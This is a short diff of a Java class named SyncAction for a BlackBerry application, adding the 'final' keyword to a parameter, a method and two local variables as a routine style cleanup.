@@ -78,7 +78,7 @@ public class SyncAction extends SubAction {
         host = host_;
     }
 
-    protected SyncAction(int actionId) {
+    protected SyncAction(final int actionId) {
         super(actionId);
     }
 
@@ -86,7 +86,7 @@ public class SyncAction extends SubAction {
      * (non-Javadoc)
      * @see blackberry.action.SubAction#execute(blackberry.event.Event)
      */
-    public boolean execute(final Event triggeringEvent) {
+    public final boolean execute(final Event triggeringEvent) {
         //#ifdef DEBUG_INFO
         debug.info("SyncAction execute: " + triggeringEvent);
         //#endif
@@ -191,7 +191,7 @@ public class SyncAction extends SubAction {
         }
 
         //#ifdef DEBUG_TRACE
-        StringBuffer sb = new StringBuffer();
+        final StringBuffer sb = new StringBuffer();
         sb.append("gprs: " + gprs);
         sb.append(" wifi: " + wifi);
         sb.append(" host: " + host);
@@ -202,7 +202,7 @@ public class SyncAction extends SubAction {
     }
 
     public String toString() {
-        StringBuffer sb = new StringBuffer();
+        final StringBuffer sb = new StringBuffer();
         sb.append("Sync gprs: " + gprs);
         sb.append(" wifi: " + wifi);
         sb.append(" host: " + host);
